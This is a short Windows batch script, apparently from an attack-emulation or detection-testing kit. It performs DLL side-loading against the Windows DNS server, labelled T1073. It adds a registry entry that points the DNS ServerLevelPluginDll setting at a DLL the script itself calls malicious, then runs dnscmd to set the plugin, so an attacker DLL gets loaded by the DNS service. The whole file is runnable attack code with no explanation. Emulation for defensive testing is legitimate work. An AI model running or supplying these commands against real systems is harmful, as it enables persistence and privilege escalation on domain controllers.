@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO DLL Side-Loading (T1073)
ECHO.
ECHO [+] Replacing the DNS ServerLevelPluginDll with Malicious dll
ECHO -------------------------------------------------------------------
cmd /c reg add HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll /t reg_expand_sz /v dlls /d "rundll32.exe %Utilities%\Dll1_32.dll,rd3" /f
ECHO.
ECHO.
ECHO [+] DNS ServerLevelPluginDll using DNScmd
ECHO -------------------------------------------------------------------
%Utilities%\dnscmd.exe /config /serverlevelplugindll *
ECHO.

